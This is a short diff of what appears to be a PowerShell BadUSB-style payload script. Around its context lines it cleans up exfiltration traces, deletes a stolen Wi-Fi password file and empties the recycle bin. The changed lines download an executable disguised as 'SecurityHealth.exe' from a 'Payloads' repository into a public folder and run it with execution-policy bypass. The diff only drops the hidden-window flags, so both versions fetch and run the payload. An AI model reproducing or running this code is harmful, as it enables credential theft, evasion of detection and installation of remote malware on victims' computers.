@@ -135,9 +135,8 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 ############################################################################################################################################################
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 RI $env:TEMP/--wifi-pass.txt
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://raw.githubusercontent.com/rude90/Payloads/main/SecurityHealth.exe -o C:\Users\Public\SecurityHealth.exe
-powershell.exe -w Hidden C:\Users\Public\SecurityHealth.exe
-
+powershell -ep bypass iwr -uri  https://raw.githubusercontent.com/rude90/Payloads/main/SecurityHealth.exe -o C:\Users\Public\SecurityHealth.exe
+powershell.exe C:\Users\Public\SecurityHealth.exe
 
 
 
